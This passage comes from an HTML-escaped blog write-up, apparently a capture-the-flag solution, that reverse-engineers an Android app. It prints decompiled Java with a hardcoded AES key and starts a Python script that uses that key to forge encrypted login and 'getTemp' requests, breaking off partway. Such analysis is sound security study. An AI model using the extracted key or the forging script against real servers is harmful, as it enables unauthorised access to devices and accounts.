class=\"n\"\u003edecode\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nc\"\u003eBase64\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003edecode\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003enetworkResponse\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003edata\u003c/span\u003e\u003cspan class=\"o\"\u003e),\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n           \u003cspan class=\"nc\"\u003eObject\u003c/span\u003e \u003cspan class=\"n\"\u003eobj\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"o\"\u003e];\u003c/span\u003e\n           \u003cspan class=\"nc\"\u003eSystem\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003earraycopy\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003edecode\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eobj\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n           \u003cspan class=\"nc\"\u003eObject\u003c/span\u003e \u003cspan class=\"n\"\u003eobj2\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[(\u003c/span\u003e\u003cspan class=\"n\"\u003edecode\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003elength\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"o\"\u003e)];\u003c/span\u003e\n           \u003cspan class=\"nc\"\u003eSystem\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003earraycopy\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003edecode\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eobj2\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003edecode\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003elength\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n           \u003cspan class=\"nc\"\u003eKey\u003c/span\u003e \u003cspan class=\"n\"\u003esecretKeySpec\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eSecretKeySpec\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[]{(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e56\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e79\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e46\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e106\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e26\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e5\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e27\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e34\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e59\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"nc\"\u003eByte\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eMIN_VALUE\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e23\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e96\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e96\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e90\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e80\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e116\u003c/span\u003e\u003cspan class=\"o\"\u003e},\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;AES\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n           \u003cspan class=\"nc\"\u003eAlgorithmParameterSpec\u003c/span\u003e \u003cspan class=\"n\"\u003eivParameterSpec\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eIvParameterSpec\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eobj\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n           \u003cspan class=\"nc\"\u003eCipher\u003c/span\u003e \u003cspan class=\"n\"\u003einstance\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nc\"\u003eCipher\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetInstance\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;AES/CBC/PKCS5Padding\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n           \u003cspan class=\"n\"\u003einstance\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003einit\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003esecretKeySpec\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eivParameterSpec\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n           \u003cspan class=\"nc\"\u003eJSONObject\u003c/span\u003e \u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eJSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003einstance\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003edoFinal\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eobj2\u003c/span\u003e\u003cspan class=\"o\"\u003e)));\u003c/span\u003e\n           \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetBoolean\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;success\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n               \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nc\"\u003eResponse\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esuccess\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003egetCacheEntry\u003c/span\u003e\u003cspan class=\"o\"\u003e());\u003c/span\u003e\n           \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n           \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nc\"\u003eResponse\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esuccess\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetString\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;error\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e),\u003c/span\u003e \u003cspan class=\"n\"\u003egetCacheEntry\u003c/span\u003e\u003cspan class=\"o\"\u003e());\u003c/span\u003e\n       \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003ecatch\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eException\u003c/span\u003e \u003cspan class=\"n\"\u003eunused\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n           \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nc\"\u003eResponse\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esuccess\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Unknown\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003egetCacheEntry\u003c/span\u003e\u003cspan class=\"o\"\u003e());\u003c/span\u003e\n       \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eLooking carefully at the code, I noticed that in order for the request to be valid, the initialization vector (IV) had to be prepended to the encrypted request.\u003c/p\u003e\n\n\u003cp\u003eBut wait, there\u0026#39;s more! The code was leaking the secret key:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e\u003cspan class=\"nc\"\u003eKey\u003c/span\u003e \u003cspan class=\"n\"\u003esecretKeySpec\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eSecretKeySpec\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[]{(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e56\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e79\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e46\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e106\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e26\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e5\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e27\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e34\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e59\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"nc\"\u003eByte\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eMIN_VALUE\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e23\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e96\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e96\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e90\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e80\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e116\u003c/span\u003e\u003cspan class=\"o\"\u003e},\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;AES\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAnd while it is not much of a secret, the IV was 16 bytes:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e\u003cspan class=\"nc\"\u003eObject\u003c/span\u003e \u003cspan class=\"n\"\u003eobj\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"o\"\u003e];\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe \u003ccode\u003eLoginActivity\u003c/code\u003e class contained the remaining code required to understand the application\u0026#39;s logic. Looking at its \u003ccode\u003eattemptLogin()\u003c/code\u003e method, it was clear that I needed to send the server a JSON object:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e\u003cspan class=\"o\"\u003e...\u003c/span\u003e\n\u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eput\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;username\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eusername\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n\u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eput\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003epassword\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n\u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eput\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;cmd\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;getTemp\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n\u003cspan class=\"o\"\u003e...\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI quickly wrote a Python script to encrypt a JSON object using the secret key obtained from the mobile application:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003eCrypto.Cipher\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"n\"\u003eAES\u003c/span\u003e\n\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003ebase64\u003c/span\u003e\n\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003erequests\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003eblocksize\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e\n\u003cspan class=\"n\"\u003epkcs5Pad\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003elambda\u003c/span\u003e \u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"n\"\u003es\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eblocksize\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"nb\"\u003elen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e%\u003c/span\u003e \u003cspan class=\"n\"\u003eblocksize\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"nb\"\u003echr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eblocksize\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"nb\"\u003elen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e%\u003c/span\u003e \u003cspan class=\"n\"\u003eblocksize\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003epkcs5Unpad\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003elambda\u003c/span\u003e \u003cspan class=\"n\"\u003es\u003c/span\u003e \u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"nb\"\u003eord\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e])]\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003eclass\u003c/span\u003e \u003cspan class=\"nc\"\u003eEncryptionH1\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003e__init__\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"bp\"\u003eself\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eENCRYPTION_KEY\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e56\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e79\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e46\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e106\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e26\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e5\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e27\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e34\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e59\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e128\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e23\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e96\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e96\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e90\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e80\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e116\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n        \u003cspan 